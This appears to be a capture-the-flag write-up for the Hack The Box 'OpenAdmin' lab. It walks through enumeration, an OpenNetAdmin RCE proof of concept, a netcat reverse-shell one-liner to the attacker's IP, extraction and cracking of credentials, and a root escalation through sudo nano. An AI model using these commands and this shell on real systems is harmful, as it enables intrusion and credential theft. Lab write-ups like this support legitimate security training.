OpenAdmin

### Lab Details 

- Difficulty: Easy
- Type: Web App, Port-forwarding, PrivEsc, Linux

#### Enumeration
- nmap
```
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4b:98:df:85:d1:7e:f0:3d:da:48:cd:bc:92:00:b7:54 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCcVHOWV8MC41kgTdwiBIBmUrM8vGHUM2Q7+a0LCl9jfH3bIpmuWnzwev97wpc8pRHPuKfKm0c3iHGII+cKSsVgzVtJfQdQ0j/GyDcBQ9s1VGHiYIjbpX30eM2P2N5g2hy9ZWsF36WMoo5Fr+mPNycf6Mf0QOODMVqbmE3VVZE1VlX3pNW4ZkMIpDSUR89JhH+PHz/miZ1OhBdSoNWYJIuWyn8DWLCGBQ7THxxYOfN1bwhfYRCRTv46tiayuF2NNKWaDqDq/DXZxSYjwpSVelFV+vybL6nU0f28PzpQsmvPab4PtMUb0epaj4ZFcB1VVITVCdBsiu4SpZDdElxkuQJz
|   256 dc:eb:3d:c9:44:d1:18:b1:22:b4:cf:de:bd:6c:7a:54 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBHqbD5jGewKxd8heN452cfS5LS/VdUroTScThdV8IiZdTxgSaXN1Qga4audhlYIGSyDdTEL8x2tPAFPpvipRrLE=
|   256 dc:ad:ca:3c:11:31:5b:6f:e6:a4:89:34:7c:9b:e5:50 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBcV0sVI0yWfjKsl7++B9FGfOVeWAIWZ4YGEMROPxxk4
80/tcp open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
| http-methods: 
|_  Supported Methods: POST OPTIONS HEAD GET
|_http-server-header: Apache/2.4.29 (Ubuntu)
```
- investigate port 80
	- enumerate directories 
```
$ ffuf -u http://10.10.10.171/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100
<snip>
music                   [Status: 301, Size: 312, Words: 20, Lines: 10, Duration: 1014ms]
artwork                 [Status: 301, Size: 314, Words: 20, Lines: 10, Duration: 4542ms]
sierra                  [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 76ms]
<snip>
```
#### Initial Foothold 
- on `http://10.10.10.171/music/` the login button will take us to `http://10.10.10.171/ona/` which display `opennetadmin` dashboard
![[opennetadmin.png]]
- from the version found POC: https://github.com/amriunix/ona-rce/blob/master/ona-rce.py
```bash
 python3 ona-rce.py exploit http://10.10.10.171/ona/
[*] OpenNetAdmin 18.1.1 - Remote Code Execution
[+] Connecting !
[+] Connected Successfully!
sh$  rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.16.22 9001 >/tmp/f

## nc listener
$ nc -lvnp 9001
listening on [any] 9001 ...
connect to [10.10.16.22] from (UNKNOWN) [10.10.10.171] 50936
bash: cannot set terminal process group (1299): Inappropriate ioctl for device
bash: no job control in this shell
```
#### Lateral Movement (If any)
- search online for `openadmin` config file
```
Key Configuration Files:
database_settings.inc.php:
This file, typically located at /opt/ona/www/local/config/database_settings.inc.php
```
- we see the db_passwd
```
www-data@openadmin:/opt/ona/www$ cat /opt/ona/www/local/config/database_settings.inc.php
</opt/ona/www/local/config/database_settings.inc.php
<?php

$ona_contexts=array (
  'DEFAULT' => 
  array (
    'databases' => 
    array (
      0 => 
      array (
        'db_type' => 'mysqli',
        'db_host' => 'localhost',
        'db_login' => 'ona_sys',
        'db_passwd' => 'n1nj4W4rri0R!',
        'db_database' => 'ona_default',
        'db_debug' => false,
      ),
    ),
    'description' => 'Default data context',
    'context_color' => '#D3DBFF',
  ),
);
```
- attempted login as `jimmy` or `joanna` via ssh didnt work the first couple times
- tried to port forward `3306 mysql` didnt find any password
- tried again worked logged in as `jimmy` via ssh
- load and execute `linpeas.sh`
- found internal facing subdomain `internal.openadmin.htb`
```
══╣ PHP exec extensions
drwxr-xr-x 2 root root 4096 Nov 22  2019 /etc/apache2/sites-enabled                                                                                         
drwxr-xr-x 2 root root 4096 Nov 22  2019 /etc/apache2/sites-enabled
lrwxrwxrwx 1 root root 32 Nov 22  2019 /etc/apache2/sites-enabled/internal.conf -> ../sites-available/internal.conf
Listen 127.0.0.1:52846
<VirtualHost 127.0.0.1:52846>
    ServerName internal.openadmin.htb
    DocumentRoot /var/www/internal
<IfModule mpm_itk_module>
AssignUserID joanna joanna
</IfModule>
    ErrorLog ${APACHE_LOG_DIR}/error.log
    CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>
```
- use `ssh` to perform port fowarding
```
$ ssh -L 52846:localhost:52846 jimmy@10.10.10.171
```
- internal facing website 
![[internal.png]]
- `DocumentRoot` is at `/var/www/internal` check for `index.php` found hashed password
```php
jimmy@openadmin:/var/www/internal$ cat index.php 
<?php
   ob_start();
   session_start();
?>

<?
   // error_reporting(E_ALL);
   // ini_set("display_errors", 1);
?>
<snip>

          <?php
            $msg = '';

            if (isset($_POST['login']) && !empty($_POST['username']) && !empty($_POST['password'])) {
              if ($_POST['username'] == 'jimmy' && hash('sha512',$_POST['password']) == '00e302ccdcf1c60b8ad50ea50cf72b939705f49f40f0dc658801b4680b7d758eebdc2e9f9ba8ba3ef8a8bb9a796d34ba2e856838ee9bdde852b8ec3b3a0523b1') {
                  $_SESSION['username'] = 'jimmy';
                  header("Location: /main.php");
              } else {
                  $msg = 'Wrong username or password.';
              }
            }
         ?>
<snip>

```
- unhash it using:https://hashes.com/en/decrypt/hash, we get plain text password `Revealed`
- after logging in we see `joanna`'s private ssh key
![[id_rsa.png]]
- when attempting to login using the private key we are prompted with password, using `john` to get the password 
```
$ ssh2john ./id_rsa > id_rsa.hash    

$ john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash

Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
bloodninjas      (./id_rsa)  

$ chmod 600 id_rsa                   

$ ssh joanna@10.10.10.171 -i ./id_rsa

```

#### Privilege Escalation
- run `sudo -l`
```
joanna@openadmin:~$ sudo -l
Matching Defaults entries for joanna on openadmin:
    env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="XAPPLRESDIR XFILESEARCHPATH
    XUSERFILESEARCHPATH",
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, mail_badpass

User joanna may run the following commands on openadmin:
    (ALL) NOPASSWD: /bin/nano /opt/priv
```
- we can run `nano` as `root`
- use `gtfobin` command to escalate privilege: https://gtfobins.github.io/gtfobins/nano/
```
Command to execute: reset; sh 1>&0 2>&0                                                                 
# # whoamip                                         ^X Read File
rootancel                                           M-F New Buffer
# ls
user.txt
```
#### Resources
- un-hash: https://hashes.com/en/decrypt/hash
#### Lesson Learned
